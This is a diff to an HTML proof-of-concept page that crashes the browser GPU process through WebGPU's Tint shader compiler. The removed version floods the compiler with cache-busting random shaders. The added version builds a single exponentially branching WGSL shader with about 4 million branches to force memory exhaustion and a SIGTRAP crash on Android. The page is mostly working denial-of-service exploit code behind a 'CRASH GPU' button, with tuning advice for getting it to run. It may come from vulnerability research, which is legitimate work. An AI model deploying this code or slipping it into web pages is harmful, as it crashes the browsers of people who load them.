@@ -1,39 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Tint OOM DoS</title>
+    <title>WebGPU Tint AST Exhaustion PoC</title>
     <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
 </head>
 <body>
-    <h2>Tint AST Memory Exhaustion PoC (Cache Bypassed)</h2>
-    <p>Clicking the button will spam the GPU process with unique payloads. Wait ~30 seconds.</p>
-    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">START GPU SPAM</button>
+    <h2>Tint AST Memory Exhaustion (SIGTRAP)</h2>
+    <p>Clicking the button builds a 4-million branch WGSL shader to OOM the GPU process.</p>
+    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
     <div id="status" style="margin-top: 20px;">Waiting...</div>
 
     <script>
         const statusEl = document.getElementById('status');
 
-        function buildKillerShader() {
-            let mathExpr = "(1.0)";
-            const ops = ['+', '-', '*', '/'];
-            const baseStr = "vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x";
-            
-            // Jitter the depth to fragment the C++ heap and ensure unique trees
-            const depth = 160 + Math.floor(Math.random() * 15);
-            
-            for (let i = 0; i < depth; i++) {
-                const op = ops[Math.floor(Math.random() * ops.length)]; 
-                mathExpr = `(${mathExpr} ${op} ${baseStr})`;
-            }
-            
-            // The Cache Buster: A random number guarantees Chrome cannot cache the parsing result!
-            return `
-                // CACHE BUSTER: ${Math.random()}
-                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
-                    let crazy_var = ${mathExpr};
-                    return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);
-                }
-            `;
+        // Exponentially branching AST generator
+        function generateMassiveAST(depth) {
+            if (depth <= 0) return `return vec4<f32>(1.0);`;
+            const branch = generateMassiveAST(depth - 1);
+            return `if (true) { ${branch} } else { ${branch} }`;
         }
 
         async function triggerCrash() {
@@ -45,25 +29,24 @@
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
 
-            let count = 0;
-            statusEl.innerText = "Bypassing Shader Cache and spamming Tint Compiler...\nWait for the Aw, Snap!";
-
-            setInterval(() => {
-                for (let i = 0; i < 25; i++) {
-                    count++;
-                    const killerWGSL = buildKillerShader();
-                    try {
-                        // Because of the cache buster, Chrome MUST parse this every single time
-                        device.createShaderModule({ code: killerWGSL });
-                    } catch (e) {
-                        // Ignore JS-side errors
-                    }
+            statusEl.innerText = "Building massive WGSL string in JavaScript (Please wait)...";
+            
+            // Depth 22 = ~4.1 million branches. 
+            // Avoids JS RangeError, but guarantees C++ Tint AST OOM.
+            setTimeout(() => {
+                try {
+                    const body = generateMassiveAST(22);
+                    const killerWGSL = `@vertex fn vs_main() -> @builtin(position) vec4<f32> {\n${body}\n}`;
+                    
+                    statusEl.innerText = "String built! Sending to Tint Compiler. Brace for Aw, Snap...";
+                    
+                    // This instantly crashes the Android GPU Process (SIGTRAP)
+                    device.createShaderModule({ code: killerWGSL });
+                    
+                } catch (e) {
+                    statusEl.innerText = "JS Error (Try lowering depth to 21 if RangeError occurs): " + e.message;
                 }
-                
-                if (count % 500 === 0) {
-                    statusEl.innerText = `Bypassed Cache & Sent ${count} unique payloads. GPU RAM filling up...`;
-                }
-            }, 10); 
+            }, 100); 
         }
 
         document.getElementById('crashBtn').addEventListener('click', triggerCrash);
